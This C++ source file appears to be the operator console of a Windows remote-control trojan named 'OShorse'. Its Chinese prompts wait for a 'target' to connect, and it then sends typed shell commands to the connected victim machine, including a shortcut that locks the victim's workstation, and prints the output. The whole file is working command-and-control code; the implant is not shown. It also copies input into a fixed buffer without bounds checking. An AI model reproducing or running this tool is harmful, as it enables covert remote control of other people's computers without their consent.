#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <winsock2.h> 
#include<bits/stdc++.h>
#define  BUFFER_SIZE 4196
using namespace std;
const char* kExitFlag = "exit";
unsigned short PORT=8080;
void get_ip(){
	ifstream fin ("connect.txt");
	fin>>PORT;
	fin.close();
}
int main() {
	get_ip();
	WORD winsock_version = MAKEWORD(2,2);
	WSADATA wsa_data;
	if (WSAStartup(winsock_version, &wsa_data) != 0) {
		printf("Failed to init socket dll!\n");
		return 1;
	}
	
	SOCKET server_socket= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (server_socket == INVALID_SOCKET) {
		printf("Failed to create server socket!\n");
		return 2;
	}
	
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.S_un.S_addr = INADDR_ANY;
	
	if (bind(server_socket, (LPSOCKADDR)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		printf("Failed to bind port!\n");
		return 3;
	}
	
	if (listen(server_socket, 10)) {
		printf("Failed to listen!\n");
		return 4;
	}
	
	struct sockaddr_in client_addr;
	int client_addr_len = sizeof(client_addr);
	printf("等待目标连线......\n");
	
	SOCKET client_socket = accept(server_socket, (SOCKADDR*)&client_addr, &client_addr_len);
	if (client_socket == INVALID_SOCKET) {
		printf("Failed to accept!\n");
		return 5;
	}
	
	printf("连线成功,IP: %s\n" , inet_ntoa(client_addr.sin_addr));
	
	char recv_buf[BUFFER_SIZE+1];
	char recv_data[BUFFER_SIZE+1];
	while (true) {
		printf("%s$ ",inet_ntoa(client_addr.sin_addr));
		char ch[BUFFER_SIZE+1]={'\0'};
		string s;
		getline(cin,s);
		if(s==""){continue;}
		else if(s=="cls"){
			system("cls");continue;
		}else if(s=="lock"){
			s="rundll32.exe user32.dll,LockWorkStation";
		}else if(s=="help"){
			printf("OShorse内置命令：\n");
			printf("锁屏：lock\n");
			printf("提示：msg [MESSAGE]\n");
			continue;
		}
		for(int i=0;i<s.size();i++){
			ch[i]=s[i];
		}
		const char* send_data=ch;
		send(client_socket, send_data, strlen(send_data), 0);
		if(s=="exit"){return 0;}
		int ret = recv(client_socket, recv_data, BUFFER_SIZE, 0);
		if (ret < 0) {
			printf("Failed to receive data!\n");
			break;
		}
		recv_data[ret]=0;
		printf("%s\n",recv_data);
	}
	
	closesocket(client_socket);
	closesocket(server_socket);
	
	WSACleanup();
	
	return 0;
}
